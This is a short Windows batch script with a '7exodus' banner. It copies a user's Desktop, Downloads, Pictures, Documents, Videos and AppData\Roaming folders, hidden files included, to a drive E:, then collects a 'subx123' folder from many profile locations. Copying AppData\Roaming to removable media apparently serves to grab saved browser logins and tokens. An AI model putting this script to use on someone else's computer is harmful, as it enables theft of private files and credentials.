color 1
echo 7exodus

cls
mkdir E:\security
mkdir E:\security\Desktop
mkdir E:\security\Downloads
mkdir E:\security\Pictures
mkdir E:\security\Documents
mkdir E:\security\Videos
mkdir E:\security\Roaming

echo Mov Rax Desktop a E:\security...
color 2
xcopy "C:\Users\NameUserChangeThis\Desktop\*" "E:\security\Desktop" /E /I /H /Y
color 1
echo Succes!
color 2
echo Mov Rax Downloads a E:\security...
xcopy "C:\Users\NameUserChangeThis\Downloads\*" "E:\security\Downloads" /E /I /H /Y
color 1
echo Succes!

color 2
echo Mov Rax de Pictures a E:\security...
xcopy "C:\Users\NameUserChangeThis\Pictures\*" "E:\security\Pictures" /E /I /H /Y
color 1
echo Succes!

color 2
echo Mov Rax Documents a E:\security...
xcopy "C:\Users\NameUserChangeThis\Documents\*" "E:\security\Documents" /E /I /H /Y
color 1
echo Succes!

color 2
echo Mov Rax Videos a E:\security...
xcopy "C:\Users\NameUserChangeThis\Videos\*" "E:\security\Videos" /E /I /H /Y
color 1
echo Succes!

color 2
echo Mov Rax AppData a E:\security...
xcopy "C:\Users\NameUserChangeThis\AppData\Roaming\*" "E:\security\Roaming" /E /I /H /Y
color 1
echo Succes!

color 5
echo Retirando programa
xcopy "C:\Users\NameUserChangeThis\Desktop\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Downloads\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Contacts\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Favorites\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Links\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Music\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\OneDrive\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Pictures\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Saved Games\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Searches\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\source\subx123" "E:\security" /E /I /H /Y
xcopy "C:\Users\NameUserChangeThis\Videos\subx123" "E:\security" /E /I /H /Y
echo Exit succes!
color 7
pause